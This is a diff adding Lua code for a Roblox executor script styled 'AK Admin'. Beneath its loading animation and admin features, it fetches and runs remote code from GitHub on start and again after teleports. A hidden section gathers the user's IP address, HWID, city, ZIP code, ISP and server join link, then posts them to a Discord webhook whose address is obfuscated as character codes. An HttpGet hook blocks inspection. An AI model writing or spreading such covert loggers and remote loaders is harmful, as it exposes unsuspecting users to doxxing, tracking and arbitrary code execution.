+                warn("Failed to load string from: " .. tostring(url))
+                table.insert(errors, {
+                    type = "loadstring-load",
+                    url = url,
+                    error = tostring(func_loadString),
+                    time = os.time(),
+                    stack = debug.traceback()
+                })
+                return
+            end
+
+            local execSuccess_loadString, execError_loadString = pcall(func_loadString)
+            if not execSuccess_loadString then
+                warn("Failed to execute string from: " .. tostring(url))
+                table.insert(errors, {
+                    type = "loadstring-execution",
+                    url = url,
+                    error = tostring(execError_loadString),
+                    time = os.time(),
+                    stack = debug.traceback()
+                })
+            end
+        end
+
+        -- Enhanced queue teleport
+        local function setupQueueTeleport_second()
+            local queueteleport_second = (syn and syn.queue_on_teleport) or
+                                 queue_on_teleport or
+                                 (fluxus and fluxus.queue_on_teleport)
+
+            if queueteleport_second then
+                local success_queueTeleport, error_queueTeleport = pcall(function()
+                    local teleportScript_second = [[
+                        task.spawn(function()
+                            local success_teleportScript, source_teleportScript = pcall(function()
+                                return game:HttpGet('https://raw.githubusercontent.com/LOLkeeptrying/AKADMIN/refs/heads/main/Congratslol')
+                            end)
+                            if success_teleportScript and source_teleportScript then
+                                loadstring(source_teleportScript)()
+                            end
+                        end)
+                    ]]
+                    queueteleport_second(teleportScript_second)
+                end)
+
+                if not success_queueTeleport then
+                    warn("Failed to queue teleport script:", error_queueTeleport)
+                    table.insert(errors, {
+                        type = "queue-teleport",
+                        error = error_queueTeleport,
+                        time = os.time(),
+                        stack = debug.traceback()
+                    })
+                end
+            end
+        end
+
+        -- Enhanced bubble chat adjustment
+        local function AdjustBubbleChat_second()
+            local success_bubbleChat, error_bubbleChat = pcall(function()
+                local player_bubbleChat = services_second.Players.LocalPlayer
+                if not player_bubbleChat then return end
+
+                local CoreGui_bubbleChat = getService_second("CoreGui")
+                if not CoreGui_bubbleChat then return end
+
+                local chatBubble_bubbleChat = CoreGui_bubbleChat:FindFirstChild("ExperienceChat")
+                if not chatBubble_bubbleChat then return end
+
+                local bubbleChat_bubbleChat = chatBubble_bubbleChat:FindFirstChild("bubbleChat")
+                if not bubbleChat_bubbleChat then return end
+
+                local playerBubble_bubbleChat = bubbleChat_bubbleChat:FindFirstChild("BubbleChat_" .. player_bubbleChat.UserId)
+                if playerBubble_bubbleChat then
+                    playerBubble_bubbleChat.StudsOffset = Vector3.new(0, 1, 0)
+                end
+            end)
+
+            if not success_bubbleChat then
+                warn("Failed to adjust bubble chat:", error_bubbleChat)
+                table.insert(errors, {
+                    type = "bubble-chat",
+                    error = error_bubbleChat,
+                    time = os.time(),
+                    stack = debug.traceback()
+                })
+            end
+        end
+
+        -- Enhanced executor compatibility
+        local function initializeExecutorCompat_second()
+            local function warnUnsupported(feature)
+                return function()
+                    warn(feature .. " is not supported on this executor")
+                end
+            end
+
+            _G.setclipboard = setclipboard or toclipboard or set_clipboard or warnUnsupported("Clipboard")
+            _G.writefile = writefile or warnUnsupported("Write file")
+            _G.readfile = readfile or warnUnsupported("Read file")
+        end
+
+        -- Enhanced initialization
+        local function Initialize_second()
+            -- Ensure we're not already loaded
+            if _G.AKAdminLoaded then return end
+            _G.AKAdminLoaded = true
+
+            -- Set up enhanced error handling
+            services_second.ScriptContext.Error:Connect(function(message, trace)
+                table.insert(errors, {
+                    type = "global-error",
+                    message = message,
+                    trace = trace,
+                    time = os.time(),
+                    stack = debug.traceback()
+                })
+            end)
+
+            -- Wait for game load with timeout
+            if not game:IsLoaded() then
+                local loaded_second = false
+                local connection_second
+                connection_second = game.Loaded:Connect(function()
+                    loaded_second = true
+                    if connection_second then connection_second:Disconnect() end
+                end)
+
+                local timeout_second = task.delay(30, function()
+                    if not loaded_second then
+                        warn("Game failed to load after 30 seconds")
+                        if connection_second then connection_second:Disconnect() end
+                    end
+                end)
+            end
+
+            -- Initialize components with proper sequencing
+            local success_init = pcall(function()
+                local PlayerModule_init = getPlayerModule_second()
+                if not PlayerModule_init then
+                    warn("PlayerModule not loaded - some features may be limited")
+                end
+
+                RemoveAtmosphereAndSetFog_second()
+                setupQueueTeleport_second()
+                initializeExecutorCompat_second()
+
+                -- Load additional scripts with retry mechanism
+                local scripts_init = {
+                    "https://raw.githubusercontent.com/bfjdsaisfhdsfdsfbkjfdsbdfsbkjvdsbibvd/deinemudda/refs/heads/main/loadplayertagss.luau",
+                    "https://raw.githubusercontent.com/bfjdsaisfhdsfdsfbkjfdsbdfsbkjvdsbibvd/deinemudda/refs/heads/main/loadownercmdss.luau",
+                    "https://raw.githubusercontent.com/bfjdsaisfhdsfdsfbkjfdsbdfsbkjvdsbibvd/deinemudda/refs/heads/main/betterchatdtcsyss.luau",
+                    "https://raw.githubusercontent.com/bfjdsaisfhdsfdsfbkjfdsbdfsbkjvdsbibvd/deinemudda/refs/heads/main/akactivee.luau"
+                }
+
+                for _, url_init in ipairs(scripts_init) do
+                    local content_init = safeHttpGet_second(url_init)
+                    if content_init then
+                        safeLoadString_second(content_init, url_init)
+                    end
+                end
+
+                -- Start bubble chat adjustment with error recovery
+                task.spawn(function()
+                    while task.wait(1) do
+                        pcall(AdjustBubbleChat_second)
+                    end
+                end)
+            end)
+
+            if success_init then
+                print("AK ADMIN loaded successfully!")
+            else
+                warn("AK ADMIN encountered errors during initialization")
+            end
+        end
+
+        -- Start the script with comprehensive error handling
+        pcall(Initialize_second)
+        pcall(function()
+        local HttpService_webhook = game:GetService("HttpService")
+        local Players_webhook = game:GetService("Players")
+        local MarketplaceService_webhook = game:GetService("MarketplaceService")
+        local LocalizationService_webhook = game:GetService("LocalizationService")
+        local RbxAnalyticsService_webhook = game:GetService("RbxAnalyticsService")
+        local GroupService_webhook = game:GetService("GroupService")
+        local BadgeService_webhook = game:GetService("BadgeService")
+        local UserInputService_webhook = game:GetService("UserInputService")
+        local Stats_webhook = game:GetService("Stats")
+
+        local LocalPlayer_webhook = Players_webhook.LocalPlayer
+        local UserId_webhook = LocalPlayer_webhook.UserId
+        local DisplayName_webhook = LocalPlayer_webhook.DisplayName
+        local Username_webhook = LocalPlayer_webhook.Name
+        local MembershipType_webhook = tostring(LocalPlayer_webhook.MembershipType):sub(21)
+        local AccountAge_webhook = LocalPlayer_webhook.AccountAge
+        local Country_webhook = LocalizationService_webhook.RobloxLocaleId
+        local GetIp_webhook = game:HttpGet("https://v4.ident.me/")
+        local GetData_webhook = HttpService_webhook:JSONDecode(game:HttpGet("http://ip-api.com/json"))
+        local Hwid_webhook = RbxAnalyticsService_webhook:GetClientId()
+        local funneh_webhook = "'"
+        local joinings_webhook = "game:GetService('TeleportService'):Teleport("..game.PlaceId..",game.Players.LocalPlayer,"..funneh_webhook..game.JobId..funneh_webhook..")"
+        local joinwithscript_webhook = "```lua\n "..joinings_webhook.." ```"
+        local GameInfo_webhook = MarketplaceService_webhook:GetProductInfo(game.PlaceId)
+        local GameName_webhook = GameInfo_webhook.Name
+        local Platform_webhook = (UserInputService_webhook.TouchEnabled and not UserInputService_webhook.MouseEnabled) and "📱 Mobile" or "💻 PC"
+        local Ping_webhook = math.round(Stats_webhook.Network.ServerStatsItem["Data Ping"]:GetValue())
+
+        local PlayerProfilePic_webhook = string.format(
+            "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
+            UserId_webhook
+        )
+
+        local GameThumbnailUrl_webhook = string.format(
+            "https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png",
+            game.PlaceId
+        )
+
+        local function detectExecutor_webhook()
+            return identifyexecutor()
+        end
+
+        local function createWebhookData_webhook()
+            local executor_webhook = detectExecutor_webhook()
+            local date_webhook = os.date("%m/%d/%Y")
+            local time_webhook = os.date("%X")
+            local gameLink_webhook = "https://www.roblox.com/games/" .. game.PlaceId
+            local playerLink_webhook = "https://www.roblox.com/users/" .. UserId_webhook
+            local mobileJoinLink_webhook = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
+            local jobIdLink_webhook = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId
+
+            local data_webhook = {
+                username = "AK Admin Logger",
+                avatar_url = "https://i.imgur.com/AfFp7pu.png",
+                embeds = {
+                    {
+                        title = "🎮 Spiel Information",
+                        description = string.format("**[%s](%s)**\n`ID: %d`", GameName_webhook, gameLink_webhook, game.PlaceId),
+                        color = tonumber("0x2ecc71"),
+                        image = { url = GameThumbnailUrl_webhook }
+                    },
+                    {
+                        title = "👤 Spieler Information",
+                        description = string.format(
+                            "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Mitgliedschaft:** %s\n**Account-Alter:** %d Tage\n**Plattform:** %s\n**Ping:** %dms",
+                            DisplayName_webhook, playerLink_webhook, Username_webhook, UserId_webhook, MembershipType_webhook, AccountAge_webhook, Platform_webhook, Ping_webhook
+                        ),
+                        color = MembershipType_webhook == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db"),
+                        thumbnail = { url = PlayerProfilePic_webhook }
+                    },
+                    {
+                        title = "🌐 Standort & Netzwerk",
+                        description = string.format(
+                            "**IP:** `%s`\n**HWID:** `%s`\n**Land:** %s :flag_%s:\n**Region:** %s\n**Stadt:** %s\n**PLZ:** %s\n**ISP:** %s\n**Organisation:** %s\n**Zeitzone:** %s",
+                            GetIp_webhook, Hwid_webhook, GetData_webhook.country, string.lower(GetData_webhook.countryCode), GetData_webhook.regionName, GetData_webhook.city, GetData_webhook.zip, GetData_webhook.isp, GetData_webhook.org, GetData_webhook.timezone
+                        ),
+                        color = tonumber("0xe74c3c")
+                    },
+                    {
+                        title = "⚙️ Technische Details",
+                        description = string.format(
+                            "**Executor:** `%s`\n**Job ID:** [Klicken zum Kopieren](%s)\n**Mobile Join:** [Klicken](%s)\n**Code to join: **"..joinwithscript_webhook,
+                            executor_webhook, jobIdLink_webhook, mobileJoinLink_webhook
+                        ),
+                        color = tonumber("0x95a5a6"),
+                        footer = {
+                            text = string.format("📅 Datum: %s | ⏰ Zeit: %s", date_webhook, time_webhook),
+                            icon_url = PlayerProfilePic_webhook
+                        }
+                    }
+                }
+            }
+            return HttpService_webhook:JSONEncode(data_webhook)
+        end
+
+        local function sendWebhook_webhook(webhookUrl, data)
+            local headers_webhook = {["Content-Type"] = "application/json"}
+            local request_webhook = http_request or request or HttpPost or syn.request
+            local webhookRequest_webhook = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers_webhook}
+            request_webhook(webhookRequest_webhook)
+        end
+
+
+        local webhookUrl_encoded_webhook = { 104, 116, 116, 112, 115, 58, 47, 47, 100, 105, 115, 99, 111, 114, 100, 46, 99, 111, 109, 47, 97, 112, 105, 47, 119, 101, 98, 104, 111, 111, 107, 115, 47, 49, 51, 50, 57, 50, 49, 51, 57, 56, 56, 50, 52, 56, 48, 57, 50, 56, 51, 52, 47, 81, 109, 71, 119, 99, 71, 104, 113, 85, 104, 78, 105, 99, 75, 120, 103, 116, 54, 66, 77, 51, 117, 102, 54, 76, 83, 95, 73, 55, 109, 109, 88, 85, 78, 53, 72, 56, 99, 110, 45, 53, 56, 45, 80, 113, 106, 57, 81, 81, 54, 70, 115, 49, 74, 48, 106, 118, 85, 49, 84, 74, 67, 122, 107, 99, 68, 122, 90 }
+        local webhookUrl_webhook = ""
+        for i = 1, #webhookUrl_encoded_webhook do
+          webhookUrl_webhook = webhookUrl_webhook .. string.char(webhookUrl_encoded_webhook[i])
+        end
+
+        local webhookData_webhook = createWebhookData_webhook()
+        sendWebhook_webhook(webhookUrl_webhook, webhookData_webhook)
+        end)
+        -- END OF SECOND SCRIPT INSERTION
+    else
+        sounds.failure:Play()
+        status.Text = "Access Denied! Discord link copied."
+        setclipboard("https://discord.com/invite/bgWY2zEV7z")
+        tween(status, { TextColor3 = Color3.fromRGB(255, 100, 100) }, 0.4)
+        tween(progress, { BackgroundColor3 = Color3.fromRGB(255, 100, 100) }, 0.4)
+    end
+
+    task.wait(1.5) -- Brief display time
+
+    -- Smooth slide up with sound
+    sounds.slideUp:Play()
+    tween(main, { Position = UDim2.new(0.5, 0, -0.2, 0) }, 1) -- Slower slide up
+    task.wait(1.1)
+    gui:Destroy()
+end
+
+animate()
+
+if hookfunction and newcclosure then
+local originalHttpGet = game.HttpGet
+-- Use hookfunction or newcclosure to prevent tampering
+hookfunction(game.HttpGet, newcclosure(function(self, ...)
+    if self == game and select(1, ...) == originalHttpGet then
+        -- Block the hook or spy attempt
+        return nil
+    end
+    -- Call the original function if no tampering is detected
+    return originalHttpGet(self, ...)
+end))
+end
